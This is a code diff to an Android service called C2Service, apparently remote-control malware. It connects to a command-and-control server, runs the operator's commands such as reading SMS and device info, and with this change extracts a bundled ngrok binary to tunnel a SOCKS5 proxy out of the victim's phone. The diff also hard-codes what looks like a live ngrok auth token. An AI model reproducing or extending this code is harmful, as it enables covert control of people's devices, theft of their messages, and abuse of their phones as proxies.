@@ -13,6 +13,7 @@ import androidx.core.app.NotificationCompat;
 
 import java.io.*;
 import java.net.Socket;
+import java.util.concurrent.TimeUnit;
 
 public class C2Service extends Service {
     private static final String CHANNEL_ID = "C2Channel";
@@ -23,6 +24,11 @@ public class C2Service extends Service {
     private volatile boolean running = true;
     private String deviceId;
     private ProxyService proxyService;
+    private Process ngrokProcess;
+    private String ngrokUrl = null;
+
+    // REPLACE WITH YOUR ACTUAL NGROK AUTH TOKEN
+    private static final String NGROK_AUTH_TOKEN = "3HkEd4EKM03szgnU4ULznnRt0fc_5xzKBV6VYf7kfjYz8SXJx";
 
     @Override
     public void onCreate() {
@@ -49,10 +55,6 @@ public class C2Service extends Service {
                 socket = new Socket(Config.HOST, Config.PORT);
                 writer = new PrintWriter(socket.getOutputStream(), true);
                 reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-
-                // Pass the socket to ProxyService
-                proxyService.setC2Socket(socket);
-
                 writer.println("DEVICE:" + deviceId);
                 writer.println("READY");
                 Log.d("C2Service", "Connected!");
@@ -85,21 +87,118 @@ public class C2Service extends Service {
         return executeCmd(command);
     }
 
+    private File extractNgrok() {
+        try {
+            File ngrokFile = new File(getFilesDir(), "ngrok");
+            if (ngrokFile.exists()) {
+                ngrokFile.delete();
+            }
+
+            InputStream in = getAssets().open("ngrok");
+            OutputStream out = new FileOutputStream(ngrokFile);
+            byte[] buffer = new byte[8192];
+            int len;
+            while ((len = in.read(buffer)) != -1) {
+                out.write(buffer, 0, len);
+            }
+            in.close();
+            out.close();
+
+            ngrokFile.setExecutable(true);
+            Log.d("C2Service", "Ngrok extracted to: " + ngrokFile.getAbsolutePath());
+            return ngrokFile;
+        } catch (Exception e) {
+            Log.e("C2Service", "Failed to extract ngrok: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private String startNgrokTunnel() {
+        try {
+            File ngrokFile = extractNgrok();
+            if (ngrokFile == null) {
+                return "❌ Ngrok extraction failed";
+            }
+
+            // Authenticate
+            if (!NGROK_AUTH_TOKEN.equals("YOUR_NGROK_AUTH_TOKEN_HERE")) {
+                ProcessBuilder authPb = new ProcessBuilder(
+                        ngrokFile.getAbsolutePath(),
+                        "authtoken",
+                        NGROK_AUTH_TOKEN
+                );
+                authPb.redirectErrorStream(true);
+                authPb.directory(getFilesDir());
+                Process authProcess = authPb.start();
+                authProcess.waitFor(5, TimeUnit.SECONDS);
+                Log.d("C2Service", "Ngrok authenticated");
+            }
+
+            // Start tunnel
+            ProcessBuilder pb = new ProcessBuilder(
+                    ngrokFile.getAbsolutePath(),
+                    "tcp",
+                    "1080"
+            );
+            pb.redirectErrorStream(true);
+            pb.directory(getFilesDir());
+
+            ngrokProcess = pb.start();
+            Log.d("C2Service", "Ngrok tunnel started");
+
+            BufferedReader ngrokReader = new BufferedReader(
+                    new InputStreamReader(ngrokProcess.getInputStream())
+            );
+
+            String line;
+            while ((line = ngrokReader.readLine()) != null) {
+                Log.d("C2Service", "Ngrok: " + line);
+                if (line.contains("tcp://")) {
+                    int start = line.indexOf("tcp://");
+                    int end = line.indexOf(" ", start);
+                    if (end == -1) end = line.length();
+                    ngrokUrl = line.substring(start + 6, end);
+                    Log.d("C2Service", "Ngrok URL: " + ngrokUrl);
+                    return "✅ Ngrok tunnel started\n🌐 SOCKS5 Proxy: " + ngrokUrl;
+                }
+            }
+
+            return "✅ Ngrok started, waiting for URL...";
+
+        } catch (Exception e) {
+            Log.e("C2Service", "Failed to start ngrok: " + e.getMessage());
+            return "❌ Ngrok failed: " + e.getMessage();
+        }
+    }
+
+    private void stopNgrokTunnel() {
+        if (ngrokProcess != null) {
+            ngrokProcess.destroy();
+            ngrokProcess = null;
+            ngrokUrl = null;
+            Log.d("C2Service", "Ngrok tunnel stopped");
+        }
+    }
+
     private String executeCmd(String cmd) {
-        // PROXY COMMANDS
         if (cmd.equalsIgnoreCase("proxy on")) {
             proxyService.startProxy();
-            return "✅ SOCKS5 proxy started on port 1080\n✅ Traffic routed through C2 tunnel";
+            String result = startNgrokTunnel();
+            return result;
         }
         if (cmd.equalsIgnoreCase("proxy off")) {
             proxyService.stopProxy();
-            return "❌ Proxy stopped";
+            stopNgrokTunnel();
+            return "❌ Proxy stopped\n❌ Ngrok tunnel stopped";
         }
         if (cmd.equalsIgnoreCase("proxy status")) {
-            return proxyService.isRunning() ? "✅ Proxy running on port 1080" : "❌ Proxy stopped";
+            String status = proxyService.isRunning() ? "✅ Proxy running" : "❌ Proxy stopped";
+            if (ngrokUrl != null) {
+                status += "\n🌐 SOCKS5 Proxy: " + ngrokUrl;
+            }
+            return status;
         }
 
-        // IP COMMANDS
         if (cmd.equalsIgnoreCase("ip")) {
             return DeviceInfo.getFullIpInfo(this);
         }
@@ -110,7 +209,6 @@ public class C2Service extends Service {
             return "External IP: " + DeviceInfo.getPublicIp();
         }
 
-        // EXISTING COMMANDS
         if (cmd.equalsIgnoreCase("ping")) return "PONG";
         if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getInfo(this);
         if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
@@ -144,6 +242,7 @@ public class C2Service extends Service {
     public void onDestroy() {
         running = false;
         if (proxyService != null) proxyService.stopProxy();
+        stopNgrokTunnel();
         try { socket.close(); } catch (Exception ignored) {}
         super.onDestroy();
     }
